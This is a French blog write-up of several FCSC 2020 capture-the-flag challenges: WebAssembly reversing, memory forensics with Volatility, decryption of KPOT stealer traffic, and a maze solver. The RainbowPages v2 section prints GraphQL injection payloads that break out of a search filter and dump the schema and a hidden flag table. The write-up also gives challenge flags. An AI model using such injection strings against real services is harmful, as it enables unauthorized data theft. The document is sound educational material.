+    i32.sub
+    i32.<span style="color:#66d9ef">const</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+    i32.and
+    tee_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+    set_global <span style="color:#960050;background-color:#1e0010">$</span>global0
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+  )
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func2 (result i32)
+    get_global <span style="color:#960050;background-color:#1e0010">$</span>global0
+  )
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func3 (param <span style="color:#960050;background-color:#1e0010">$</span>var0 i32) (result i32)
+    (local <span style="color:#960050;background-color:#1e0010">$</span>var1 i32) (local <span style="color:#960050;background-color:#1e0010">$</span>var2 i32) (local <span style="color:#960050;background-color:#1e0010">$</span>var3 i32) (local <span style="color:#960050;background-color:#1e0010">$</span>var4 i32) (local <span style="color:#960050;background-color:#1e0010">$</span>var5 i32)
+    i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">70</span>
+    set_local <span style="color:#960050;background-color:#1e0010">$</span>var3
+    i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">1024</span>
+    set_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+    block <span style="color:#960050;background-color:#1e0010">$</span>label0
+      get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+      i32.load8_u
+      tee_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+      i32.eqz
+      br_if <span style="color:#960050;background-color:#1e0010">$</span>label0
+      loop <span style="color:#960050;background-color:#1e0010">$</span>label2
+        block <span style="color:#960050;background-color:#1e0010">$</span>label1
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+          i32.load8_u
+          tee_local <span style="color:#960050;background-color:#1e0010">$</span>var4
+          i32.ne
+          br_if <span style="color:#960050;background-color:#1e0010">$</span>label1
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var3
+          i32.<span style="color:#66d9ef">const</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+          i32.add
+          tee_local <span style="color:#960050;background-color:#1e0010">$</span>var3
+          i32.eqz
+          br_if <span style="color:#960050;background-color:#1e0010">$</span>label1
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var4
+          i32.eqz
+          br_if <span style="color:#960050;background-color:#1e0010">$</span>label1
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+          i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">1</span>
+          i32.add
+          set_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+          i32.load8_u offset<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+          set_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+          i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">1</span>
+          i32.add
+          set_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+          get_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+          br_if <span style="color:#960050;background-color:#1e0010">$</span>label2
+          br <span style="color:#960050;background-color:#1e0010">$</span>label0
+        end <span style="color:#960050;background-color:#1e0010">$</span>label1
+      end <span style="color:#960050;background-color:#1e0010">$</span>label2
+      get_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+      set_local <span style="color:#960050;background-color:#1e0010">$</span>var5
+    end <span style="color:#960050;background-color:#1e0010">$</span>label0
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var5
+    i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">255</span>
+    i32.and
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+    i32.load8_u
+    i32.sub
+  )
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func4 (param <span style="color:#960050;background-color:#1e0010">$</span>var0 i32) (result i32)
+    (local <span style="color:#960050;background-color:#1e0010">$</span>var1 i32) (local <span style="color:#960050;background-color:#1e0010">$</span>var2 i32)
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+    i32.load8_u
+    tee_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+    <span style="color:#66d9ef">if</span>
+      get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+      set_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+      loop <span style="color:#960050;background-color:#1e0010">$</span>label0
+        get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+        get_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+        i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">3</span>
+        i32.xor
+        i32.store8
+        get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+        i32.load8_u offset<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+        set_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+        get_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+        i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">1</span>
+        i32.add
+        set_local <span style="color:#960050;background-color:#1e0010">$</span>var1
+        get_local <span style="color:#960050;background-color:#1e0010">$</span>var2
+        br_if <span style="color:#960050;background-color:#1e0010">$</span>label0
+      end <span style="color:#960050;background-color:#1e0010">$</span>label0
+    end
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+    call <span style="color:#960050;background-color:#1e0010">$</span>func3
+    i32.eqz
+  )
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func5
+    nop
+  )
+  (data (i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">1024</span>)
+    <span style="color:#e6db74">&#34;E@P@x4f1g7f6ab:42`1g:f:7763133;e0e;03`6661`bee0:33fg732;b6fea44be34g0~&#34;</span>
+  )
+)
+</code></pre></div><p>On conclut assez rapidement que la chaine qui est en bas est la chaine qui est comparée avec le flag rentré.. C&rsquo;est donc notre flag ! De plus si les @ sont des C ça confirme notre théorie.</p>
+<p>Ici avec un bruteforce depuis cyberchef sur le XOR nous pouvions avoir le flag ! Mais disons que par passion avec un ami, <strong>Zarked</strong>, nous avons fait ça à la main.</p>
+<p>Nous avons regardé comment fonctionnait l&rsquo;algo et on pouvait voire que chaque charctère était modifié mais de la même façon. En faite le code prenait les 4 derniers bits du charactère ASCII et il faisait une opération dessus. De ce fait nous avions toujours pour un charactère les 4 premiers bits qui ne changaient pas et les derniers qui étaient changés. Bon.. On s&rsquo;est dit &ldquo;il y a que 16 combinaisons à tester&rdquo; et voilà ce qu&rsquo;on a obtenu :</p>
+<pre><code>0000 -&gt; 0011
+0001 -&gt; 0010
+0010 -&gt; 0001
+0011 -&gt; 0000
+0100 -&gt; 0111
+0101 -&gt; 0110
+0110 -&gt; 0101
+0111 -&gt; 0100
+1000 -&gt; 1011
+1001 -&gt; 1010
+1010 -&gt; 1001
+1011 -&gt; 1000
+1100 -&gt; 1111
+1101 -&gt; 1110
+1110 -&gt; 1101
+1111 -&gt; 1100
+</code></pre><p>Voici donc le code pour tout décode :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dict <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;0000&#39;</span> : <span style="color:#e6db74">&#39;0011&#39;</span>, <span style="color:#e6db74">&#39;0001&#39;</span> : <span style="color:#e6db74">&#39;0010&#39;</span>, <span style="color:#e6db74">&#39;0010&#39;</span> : <span style="color:#e6db74">&#39;0001&#39;</span>, <span style="color:#e6db74">&#39;0011&#39;</span> : <span style="color:#e6db74">&#39;0000&#39;</span>, <span style="color:#e6db74">&#39;0100&#39;</span> : <span style="color:#e6db74">&#39;0111&#39;</span>, <span style="color:#e6db74">&#39;0101&#39;</span> : <span style="color:#e6db74">&#39;0110&#39;</span>, <span style="color:#e6db74">&#39;0110&#39;</span> : <span style="color:#e6db74">&#39;0101&#39;</span>, <span style="color:#e6db74">&#39;0111&#39;</span> : <span style="color:#e6db74">&#39;0100&#39;</span>, <span style="color:#e6db74">&#39;1000&#39;</span> : <span style="color:#e6db74">&#39;1011&#39;</span> , <span style="color:#e6db74">&#39;1001&#39;</span> : <span style="color:#e6db74">&#39;1010&#39;</span>, <span style="color:#e6db74">&#39;1010&#39;</span> : <span style="color:#e6db74">&#39;1001&#39;</span>,<span style="color:#e6db74">&#39;1011&#39;</span> : <span style="color:#e6db74">&#39;1000&#39;</span>,<span style="color:#e6db74">&#39;1100&#39;</span> : <span style="color:#e6db74">&#39;1111&#39;</span>, <span style="color:#e6db74">&#39;1101&#39;</span> : <span style="color:#e6db74">&#39;1110&#39;</span>,<span style="color:#e6db74">&#39;1110&#39;</span> : <span style="color:#e6db74">&#39;1101&#39;</span>, <span style="color:#e6db74">&#39;1111&#39;</span> : <span style="color:#e6db74">&#39;1100&#39;</span>}
+
+flagenc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;E@P@x4f1g7f6ab:421g:f:7763133;e0e;036661`bee0:33fg732;b6fea44be34g0~&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flagenc:
+    binary <span style="color:#f92672">=</span> (bin(int<span style="color:#f92672">.</span>from_bytes(i<span style="color:#f92672">.</span>encode(), <span style="color:#e6db74">&#39;big&#39;</span>)))
+    strbinary <span style="color:#f92672">=</span> str(binary)
+    swap <span style="color:#f92672">=</span> strbinary[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
+    strbinary <span style="color:#f92672">=</span> strbinary[:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]
+    afteroffset <span style="color:#f92672">=</span> dict<span style="color:#f92672">.</span>get(swap)
+    strbinary <span style="color:#f92672">=</span> strbinary <span style="color:#f92672">+</span> afteroffset
+    binary <span style="color:#f92672">=</span> int(strbinary, <span style="color:#ae81ff">2</span>)
+    flag <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> binary<span style="color:#f92672">.</span>to_bytes((binary<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>)<span style="color:#f92672">.</span>decode()
+<span style="color:#66d9ef">print</span>(flag)
+
+</code></pre></div><p>Après execution nous avons notre Flag : <strong>FCSC{7e2d4e5ba9712d9e944502008f3f8305552caff3900ed4018a5efb77af07d3}</strong></p>
+<h2 id="rainbowpages-v2">RainbowPages v2</h2>
+
+
+
+  <img src="/img/FCSC2020/rpdchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>RainbowPages v2 était le challenge avec le plus de points en Web mais celui sur lequel j&rsquo;ai le moins galéré.. Comme quoi la diffuclté est relative à chacun. Mon idée de départ était de réécrire toute la requête et d&rsquo;ajouter un commentaire à la fin pour annuler le reste. Premier objectif, essayer de forger une requête légitime.</p>
+<p>Première étape, comme tout à l&rsquo;heure j&rsquo;essaie de lancer des requêtes pour sonder la réaction du serveur.</p>
+<p><em>NB : tous les payloads qui suivent sont encodés en base64</em></p>
+<p><code>{}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdtest.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p><code>Royer&quot;}}) { nodes { firstname, lastname, speciality, price }}} # </code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdtest2.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Ici on voit qu&rsquo;il y a une paranthèse en trop</p>
+<p><code> </code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdtest3.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Ici nous n&rsquo;avancons pas trop, je décide de vérifier si la requête n&rsquo;a pas changée. En effet, maintenant nous pouvons faire une recherche sur le nom et prénom du chef cuisinier. Nous supposons que la syntaxe est la suivante :</p>
+
+
+
+  <img src="/img/FCSC2020/rpdsyn.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>On suppose donc que la requête ressemble à ça
+<code>{ allCooks (filter: { OR: [{firstname: {like: &quot;%'+searchInput+'%&quot;}}, {lastname: {like: &quot;%'+searchInput+'%&quot;}}]}) { nodes { firstname, lastname, speciality, price }}} </code></p>
+<p>Voici donc le paylaod</p>
+<p><code> Royer&quot;}}, {lastname: {like: &quot;Royer&quot;}}]}) { nodes { firstname, lastname, speciality, price }}} #</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdreq.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Nous essayons maintenant de faire un équivalent d&rsquo;un union.</p>
+<p><code>Royer&quot;}}, {lastname: {like: &quot;Royer&quot;}}]}) { nodes { firstname, lastname, speciality, price }} query {__schema{types{name}}}} #</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdun.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Ca fonctionne bien.. On essaie de trouver la table correspondante au flag :</p>
+<p><code>Royer&quot;}}, {lastname: {like: &quot;Royer&quot;}}]}) { nodes { firstname, lastname, speciality, price }} query {__schema{types{fields{name}}}}} #</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdtable.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Il ne nous reste plus qu'à trouver le &ldquo;Fields&rdquo; du flag. Nous pouvons le trouver ici :</p>
+<p><code>Royer&quot;}}, {lastname: {like: &quot;Royer&quot;}}]}) { nodes { firstname, lastname, speciality, price }} query {__type(name: &quot;FlagNotTheSameTableName&quot;) {fields:  {name}}}} #</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdfield.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Puis dernière étape.. Afficher le flag :)</p>
+<p><code>Royer&quot;}}, {lastname: {like: &quot;Royer&quot;}}]}) { nodes { firstname, lastname, speciality, price }} query {allFlagNotTheSameTableNames{nodes{flagNotTheSameFieldName}}}} #</code></p>
+
+
+
+  <img src="/img/FCSC2020/rpdflag.png" alt="FCSC Write up web" class="imageformat"/>
+
+<h1 id="forensics">Forensics</h1>
+<p>Voici tous les challenges Forensics :</p>
+
+
+
+  <img src="/img/FCSC2020/forensicchall.png" alt="forensicFCSC" class="imageformat"/>
+
+<h2 id="petite-frappe-2">Petite frappe 2</h2>
+
+
+
+  <img src="/img/FCSC2020/petitefrappe.png" alt="petitefrappe2" class="imageformat"/>
+
+<p>Pour &ldquo;Petite frappe 2&rdquo; nous avions accès à un fichier texte :</p>
+
+
+
+  <img src="/img/FCSC2020/petitefrappetexte.png" alt="petitefrappe2enonce" class="imageformat"/>
+
+<p>Comme nous n&rsquo;avons pas eu beaucoup d&rsquo;indications, je me suis de suite dis que le Keylogger devait être un Keylogger déjà existant et surement disponnible sur internet.</p>
+<p>En effet, le Keylogger et son format peuvent être retrouvés ici : <a href="https://blog.rom1v.com/2011/11/keylogger-sous-gnulinux-enregistrer-les-touches-tapees-au-clavier/">https://blog.rom1v.com/2011/11/keylogger-sous-gnulinux-enregistrer-les-touches-tapees-au-clavier/</a></p>
+<p>J&rsquo;ai tout simplement téléchargé le script de decode et je l&rsquo;ai executé.</p>
+
+
+
+  <img src="/img/FCSC2020/petitefrappedecode.png" alt="petitefrappe2decode" class="imageformat"/>
+
+<p>Nous pouvons valider le challenge avec ce flag : <strong>FCSC{un_clavier_azerty_en_vaut_deux}</strong></p>
+<h2 id="académie-de-linvestigation---premiers-artéfacts">Académie de l&rsquo;investigation - Premiers artéfacts</h2>
+
+
+
+  <img src="/img/FCSC2020/ai.png" alt="Académie Investigation" class="imageformat"/>
+
+<p>Ici nous récuperons le dump du premier challenge &ldquo;Académie de l&rsquo;investigation&rdquo;</p>
+<p>C&rsquo;est un dump linux, nous devons donc créer un profile pour pouvoir utiliser volatility.
+La version de la debian étant une 5.4 j&rsquo;ai utilisé ma Kali également en 5.4 pour créer le profil.</p>
+
+
+
+  <img src="/img/FCSC2020/ai1.png" alt="Académie Investigation" class="imageformat"/>
+
+<p>Une fois fait il faut le zip pour intéragir avec volatility</p>
+
+
+
+  <img src="/img/FCSC2020/aiprofile.png" alt="Create Profile Linux" class="imageformat"/>
+
+<p>J&rsquo;ai commencé par chercher le nombre de connection établie. On a pu en compter <strong>13</strong>.</p>
+
+
+
+  <img src="/img/FCSC2020/aiprofile.png" alt="Netsat Established Academy" class="imageformat"/>
+
+<p>J&rsquo;ai ensuite cherché la commande exacte executé à l&rsquo;heure demandé. <strong>nmap -sS -sV 10.42.42.0/24</strong></p>
+
+
+
+  <img src="/img/FCSC2020/aidate.png" alt="Volatility Hour FCSC" class="imageformat"/>
+
+<p>Pour finir 	il a fallu chercher le nom du processus pour le PID 1254.</p>
+
+
+
+  <img src="/img/FCSC2020/aipid.png" alt="Volatility processus" class="imageformat"/>
+
+<p>le flag était donc : <strong>FCSC{pool-xfconfd:nmap -sS -sV 10.42.42.0/24:13}</strong></p>
+<h2 id="académie-de-linvestigation---porte-dérobée">Académie de l&rsquo;investigation - Porte dérobée</h2>
+
+
+
+  <img src="/img/FCSC2020/backdoor.png" alt="Porte dérobée Write Up FCSC" class="imageformat"/>
+
+<p>Sur le dump monté précédemment il y avait une porté dérobée, l&rsquo;objectif était de la retrouver.</p>
+<p>Pour cela on réutilise le même dump et c&rsquo;est parti ! Je me doutais que c'était via le service netcat. Donc j&rsquo;ai regardé si un port n'était pas en écoute avec ce service via la commade suivante :</p>
+
+
+
+  <img src="/img/FCSC2020/backdoortest.png" alt="backdoor enum" class="imageformat"/>
+
+<p>En attendant un peu j&rsquo;ai pu obtenir le résultat suivant :</p>
+
+
+
+  <img src="/img/FCSC2020/backdoornc.png" alt="backdoor netcat" class="imageformat"/>
+
+<p>Il me fallait le PID exacte pour être sur de l&rsquo;IP et de l&rsquo;heure.</p>
+<p>J&rsquo;ai ensuite concentré mes recherches sur ce service avec les commandes suivantes :</p>
+
+
+
+  <img src="/img/FCSC2020/backdoordate.png" alt="backdoor date FCSC volatility" class="imageformat"/>
+
+<p>Me voilà avec l&rsquo;heure.</p>
+
+
+
+  <img src="/img/FCSC2020/backdoorip.png" alt="backdoor IP FCSC volatility" class="imageformat"/>
+
+<p>Maintenant l&rsquo;IP, je fais une dernière commande pour vérifier</p>
+
+
+
+  <img src="/img/FCSC2020/backdoorpid.png" alt="backdoor PID FCSC volatility" class="imageformat"/>
+
+<p>Hop hop hop voilà le flag : <strong>FCSC{36280:fd:6663:7363:1000:55cf:b9c6:f41d:cc24:2020-03-26 23:24:20}</strong></p>
+<h2 id="académie-de-linvestigation---rédaction">Académie de l&rsquo;investigation - Rédaction</h2>
+
+
+
+  <img src="/img/FCSC2020/redaction.png" alt="Rédaction WriteUps FCSC" class="imageformat"/>
+
+<p>Pour rédaction il fallait lire le contenu d&rsquo;un docx. Il était forcément écrit dans la mémoire ! Seulement je ne voyais pas comment lire le contenu d&rsquo;un fichier avec volatily. Avec une petite recherche sur internet nous trouvons les &ldquo;balises&rdquo; du texte d&rsquo;un docx. J&rsquo;ai donc utilisé la commande <strong>Strings</strong> avec un grep sur les balises pour trouver le contenu.</p>
+
+
+
+  <img src="/img/FCSC2020/redactionimg.png" alt="Rédaction WriteUps FCSC" class="imageformat"/>
+
+<p>Nous pouvons lire le &ldquo;preuve&rdquo; en plein milieu ! <strong>FCSC{PQHJRTSFYH-3467024-LSHRFLDFGA}</strong></p>
+<h2 id="chapardeur-de-mots-de-passe">Chapardeur de mots de passe</h2>
+
+
+
+  <img src="/img/FCSC2020/chapardeur.png" alt="Chapardeur WriteUps FCSC" class="imageformat"/>
+
+<p>Déja en ouvrant la trame Wireshark nous avions ce message :</p>
+
+
+
+  <img src="/img/FCSC2020/chapardeurerror.png" alt="Chapardeur WriteUps FCSC" class="imageformat"/>
+
+<p>Mais je ne m&rsquo;y suis pas attardé. Je n&rsquo;y connaissais pas grand choses en exfiltration de données. Mon premier rèflexe a été de regarder si ce n'était pas via des paquets ICMP ou DNS mais rien d&rsquo;intéressant.. En regardant quelques sources sur internet j&rsquo;ai compris que lors d&rsquo;une exfiltration il y avait souvent des pics d&rsquo;activté sur le réseau. J&rsquo;ai donc sorti ce graph de wireshark :</p>
+
+
+
+  <img src="/img/FCSC2020/chapardeurstat.png" alt="Chapardeur WriteUps FCSC" class="imageformat"/>
+
+<p>Je me suis donc dirigé vers les paquets au début du pic. C'était une connexion FTP en chiffré. J&rsquo;ai hésité à faire des connexions sur ce FTP mais c'était certain que c'était hors-scope.</p>
+<p>J&rsquo;avais déjà googlé le nom <strong>KPOT V1</strong> pour voir si je pouvais trouver la première version du malware mais finalement rien. J&rsquo;ai donc cette fois googlé le malware <strong>KPOT V2</strong> et je suis tombé sur ce lien très très intéressant. <a href="https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal">https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal</a></p>
+<p>Je me suis donc mis à la recherche des requêtes malveillantes.</p>
+
+
+
+  <img src="/img/FCSC2020/chapardeurreq.png" alt="KPOT V2 malware" class="imageformat"/>
+
+<p>Des petites explications sont nécessaires pour la compréhension de la suite. Voici comment fonctionne le malware :</p>
+<ol>
+<li>Il envoie une requête GET pour récuper la clé XOR qui sert au chiffrement.</li>
+<li>Le serveur web nous envoyé une requête codé en base64 puis en XOR.</li>
+<li>Le malware récupère cette clé, puis la décrypt.</li>
+<li>Le malware utilise la clé pour coder les data exfilitrées</li>
+</ol>
+<p>Décoder la réponse Get en base64 n'était donc pas un problème. Cependant nous ne savions pas quel &ldquo;clé&rdquo; XOR était utilisée pour récupérer la clé en claire. Cependant nous savions que la chaine finissait par <code>__DELIMM____DELIMM____DELIM__ </code>. Il était donc possible de bruteforce la clé avec ce code python :</p>
+<p>
+
+
+  <img src="/img/FCSC2020/chapardeurpython.png" alt="Python XOR bruteforce" class="imageformat"/>
+
+<em>Ce qui était dans le fichier texte était décode en base64</em></p>
+<p>Ici nous ajoutions le charctère au début de notre chaine car nous bruteforcons à partir de la fin. Il fallait faire cette manipulation pour que la clé soit dans le bon sens. Ensuite j&rsquo;ai bouclé sur 50 fois car de toute façon ça m&rsquo;aurait arrété pour une erreure (oui j&rsquo;avais la flemme et il était tard).</p>
+
+
+
+  <img src="/img/FCSC2020/charpardekey.png" alt="Python XOR bruteforce" class="imageformat"/>
+
+<p>Ici nous voyons que la clé se répète, nous avons juste à prendre la chaine unique.
+Ensuite il fallait récupérer le contenu de la requête POST pour déchiffrer la requete. On récupère le contenu :</p>
+
+
+
+  <img src="/img/FCSC2020/chapardepost.png" alt="Python XOR bruteforce" class="imageformat"/>
+
+<p>Ensuite on mettait ça dans un script python et hop on faisait tout tourner.</p>
+
+
+
+  <img src="/img/FCSC2020/chapardeurpy2.png" alt="Python decrypt" class="imageformat"/>
+
+<p>Dans la variable key nous avons la clé trouvée à l'étape d&rsquo;avant. Dans char il fallait garder que les données dans le POST et pas les headers de la requête. Ensuite dans une boucle on faisait notre opération XOR. Cependant je n&rsquo;obtenais pas des résultats satisfaisants. C'était parceque ce que nous avions ce n'étais pas la clé dans l&rsquo;ordre, je l&rsquo;ai donc remise dans l&rsquo;ordre en faisant + 1 à chaque fois et en vérifiant que ça fonctionnait. Au bout du 4eme décalage nous obtenions ça :</p>
+
+
+
+  <img src="/img/FCSC2020/chapardeurres.png" alt="Python decrypt" class="imageformat"/>
+
+<p>Bingo ! Il ne manquait plus qu&rsquo;a augmenter le nombre d&rsquo;itération et faire en sorte que lorsque la clé arrive au dernier charactre elle reparte du début. Bref voici le code final :</p>
+
+
+
+  <img src="/img/FCSC2020/chapardefinalcode.png" alt="Python decrypt" class="imageformat"/>
+
+<p>Et voici le résultat :</p>
+
+
+
+  <img src="/img/FCSC2020/chaparderesultend.png" alt="Python decrypt" class="imageformat"/>
+
+<p>Voici notre flag à la fin : <strong>FCSC{469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7}</strong></p>
+<h1 id="misc">Misc</h1>
+<p>Voici tous les challenges Misc :</p>
+
+
+
+  <img src="/img/FCSC2020/miscchall.png" alt="Misc FCSC" class="imageformat"/>
+
+<h2 id="randomito">Randomito</h2>
+
+
+
+  <img src="/img/FCSC2020/randchall.png" alt="Write up Misc FCSC" class="imageformat"/>
+
+<p>C&rsquo;est le challenge que j&rsquo;ai flag le plus rapidement je crois. Tout simplement parce que lorsque je suis sur une application python le premier truc que je fais c&rsquo;est de test l&rsquo;input avec un code. Et ça a marché.</p>
+
+
+
+  <img src="/img/FCSC2020/randa.png" alt="Write up Misc FCSC" class="imageformat"/>
+
+<p>Maintenant affichons notre flag :</p>
+
+
+
+  <img src="/img/FCSC2020/randb.png" alt="Write up Misc FCSC" class="imageformat"/>
+
+<h2 id="mazopotamia">Mazopotamia</h2>
+
+
+
+  <img src="/img/FCSC2020/randomito.png" alt="Write up Misc FCSC" class="imageformat"/>
+
+<p>Bon, le challenge qui m&rsquo;a rendu le plus fou et qui a provoqué le plus de nuit blanche. Sur le papier il fallait résoudre le labyrinthe en suivant le pattern du dessus. A chaque fois que nous passons dans une porte rouge nous devons passer dans une bleu. Voilà un autre exemple avec la solution :</p>
+
+
+
+  <img src="/img/FCSC2020/labsolve.png" alt="Write up Misc FCSC" class="imageformat"/>
+
+<p>Ensuite il fallait noter la solution pour sortir ici c'était : NWNEENWNWWSSEEEESSEENNNNWWNNWWSSWSSEEES</p>
+<p>Pour résoudre ce challenge j&rsquo;ai fait un script python avec des fonctions récursives. Au tout début mon script s&rsquo;occupait de quadriller et de changer les dimensions de l&rsquo;image. Mon script ne cherchait jamais la sortie, il cherchait à chaque fois une porte qui avait la couleur correspondante au pattern. Et lorsqu&rsquo;il était bloqué il revenait en arrière en effacant les données correspondantes au chemin. A chaque fois qui tombait sur la couleur orange, il vérifié juste si la case sur laquelle il était, correspondait à la sortie calculée précédemment.</p>
+<p>Voici donc mon script pas à pas pour les courageux :</p>
+<p>Tout d&rsquo;abord on commence par le main !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+<span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
+<span style="color:#f92672">import</span> matplotlib.pyplot <span style="color:#f92672">as</span> plt
+<span style="color:#f92672">import</span> matplotlib.ticker <span style="color:#f92672">as</span> plticker
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> datetime<span style="color:#f92672">,</span> json<span style="color:#f92672">,</span> random
+<span style="color:#f92672">import</span> telnetlib
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+<span style="color:#f92672">from</span> io <span style="color:#f92672">import</span> BytesIO
+
+sys<span style="color:#f92672">.</span>setrecursionlimit(<span style="color:#ae81ff">100000</span>)
+tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet(<span style="color:#e6db74">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">6002</span>)
+tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Ce n&#39;est pas du brute force ! je configure ma connection </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+xi <span style="color:#f92672">=</span> tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Now enter your solution:&#34;</span> )
+<span style="color:#66d9ef">print</span>(xi)
+xi <span style="color:#f92672">=</span> xi<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+Recup(xi,<span style="color:#ae81ff">0</span>)
+</code></pre></div><p>Ici on s&rsquo;occupe juste de se connecter au challenge, et de récupérer notre image encoder en base64 (ah oui l&rsquo;image était encodée en base64 btw)
+J&rsquo;ai aussi dû repousser la limite de la récursion pour les fonctions.</p>
+<p>On rentre dans notre fonction Recup:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Recup</span>(xi, cc):
+    end <span style="color:#f92672">=</span> False
+    start <span style="color:#f92672">=</span> False
+    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#75715e">#print(xi)</span>
+    imgencode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    count <span style="color:#f92672">=</span> cc
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Recherche du début de la clé&#34;</span>) 
+    <span style="color:#66d9ef">while</span> end <span style="color:#f92672">==</span> False:
+
+        <span style="color:#66d9ef">if</span> xi[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;BEGIN MAZE&#34;</span>:
+            count <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+            <span style="color:#66d9ef">if</span> count <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> : <span style="color:#75715e">#on ne stocke que le deuxième labyrinthe </span>
+            				<span style="color:#75715e">#(plus tard nous aurons toujours la bonne valeur pour rester à 2)</span>
